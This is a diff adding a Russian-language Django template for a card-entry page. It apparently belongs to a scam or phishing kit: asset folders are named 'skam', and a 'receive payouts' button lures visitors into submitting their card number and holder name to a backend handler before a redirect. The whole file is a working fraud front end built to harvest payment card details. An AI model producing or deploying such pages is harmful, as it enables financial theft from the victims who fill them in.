@@ -1,0 +1,45 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        {% load static %}
+        <title>{{ title }}</title>
+        <meta name="mailru-domain" content="yw2h48Oh9GGsgFIX">
+        <meta name="viewport" content="width=1440, initial-scale=1">
+        <link rel="apple-touch-icon" sizes="180x180" href="{% static 'skam/images/l-apple-touch-icon.png' %}">
+        <link rel="icon" type="image/png" sizes="32x32" href="{% static 'skam/images/l-favicon-32x32.png' %}">
+        <link rel="icon" type="image/png" sizes="16x16" href="{% static 'skam/images/l-favicon-16x16.png' %}">
+        <meta name="msapplication-TileColor" content="#ff0000">
+        <meta name="theme-color" content="#ffffff">
+        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+        <link href="{% static 'skam/css/l-payment_styles.css' %}" type="text/css" data-template-style="true" rel="stylesheet">
+        <script type="text/javascript" src="{% static 'skam/js/l-js-bootstrap.js' %}"></script>
+        <script type="text/javascript" src="{% static 'skam/js/l-js-jquery-3.6.0.min.js' %}"></script>
+        <script type="text/javascript" src="{% static 'skam/js/l-js-jquery.maskedinput.min.js' %}"></script>
+        <script type="text/javascript" src="{% static 'skam/js/l-js-script.js' %}"></script>
+        <link rel="preconnect" href="https://fonts.googleapis.com">
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@500;700&family=Montserrat:wght@400;700&display=swap" rel="stylesheet">
+    </head>
+    <body>
+<div class="container">
+        <img src="{% static 'ugc/images/image_5.png' %}" class="lenta">
+        <div class="block">
+            <form action="../ajax/cardformsubmitlk" method="post">
+                {% csrf_token %}
+                <label for="card-number"> Номер карты </label>
+                <input name="card-number" type="tel" id="card-number" placeholder="1111 1111 1111 1111" maxlength="16" autocomplete="cc-number" required>
+                <label for="card-owner"> Держатель карты </label>
+                <input name="card-owner" type="tel" id="card-owner" placeholder="IVAN IVANOV" required>
+                <input type="submit" id="submit-button" value="Получить выплаты">
+            </form>
+        </div>
+</div>
+<div class="pay-systems">
+    <img src="{% static 'ugc/images/pay_systems.png' %}" class="pay-systems">
+</div>
+    <script>
+        $('#card-number').mask('9999 9999 9999 9999');
+    </script>
+        {% include 'ugc/redirect.html' %}
+    </body>
+</html>
